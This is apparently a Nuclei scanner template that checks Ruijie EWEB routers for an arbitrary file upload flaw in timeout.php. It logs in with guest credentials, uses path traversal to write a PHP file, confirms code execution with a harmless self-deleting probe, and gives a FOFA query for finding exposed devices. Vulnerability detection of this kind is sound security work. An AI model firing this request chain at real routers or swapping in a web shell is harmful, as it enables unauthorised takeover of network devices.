http:
    - extractors:
        - group: 1
          internal: true
          name: RUIJIEID
          part: header
          regex:
            - RUIJIEID=(.*?);
          type: regex
      raw:
        - |
          POST /ddi/server/login.php HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
          Content-Type: application/x-www-form-urlencoded

          username=guest&password=guest?
    - matchers:
        - part: body
          type: word
          words:
            - "24642"
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /system_pi/timeout.php?a=upload HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
          Cookie: {{RUIJIEID}}
          Content-Type: application/x-www-form-urlencoded

          fileName=../tmp/html/{{username}}.php&mes=<?php print(111*222);unlink(__FILE__);?>
        - |
          GET /{{username}}.php HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
          Cookie: {{RUIJIEID}}
id: ruijieEWEB-timeout_php-File-upload
info:
    author: Superhero
    description: |-
        fofa: title="锐捷网络-EWEB网管系统"
        锐捷EWEB路由器 timeout.php 接口存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
    name: 锐捷EWEB路由器 timeout.php 任意文件上传漏洞
    reference:
        - https://mp.weixin.qq.com/s/uvgXkz89Dhp4xbsPowlyLA
    severity: high
    tags:
        - 锐捷eweb
variables:
    username: '{{to_lower(rand_base(6))}}'
